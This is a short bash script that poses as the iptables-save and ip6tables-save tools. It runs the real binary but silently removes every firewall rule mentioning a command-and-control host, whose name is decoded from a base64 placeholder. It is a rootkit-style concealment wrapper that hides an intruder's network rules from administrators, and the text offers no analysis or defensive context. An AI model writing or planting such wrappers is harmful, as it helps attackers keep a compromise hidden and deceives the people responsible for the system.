#!/bin/bash
if [[ "$0" == *"ip6tables-save"* ]]; then
    REAL="/usr/sbin/ip6tables-save"
else
    REAL="/usr/sbin/iptables-save"
fi

C2_HOST=$(printf "%s" "__ENC__" | base64 -d)

$REAL "$@" | grep -v "$C2_HOST"
exit ${PIPESTATUS[0]}
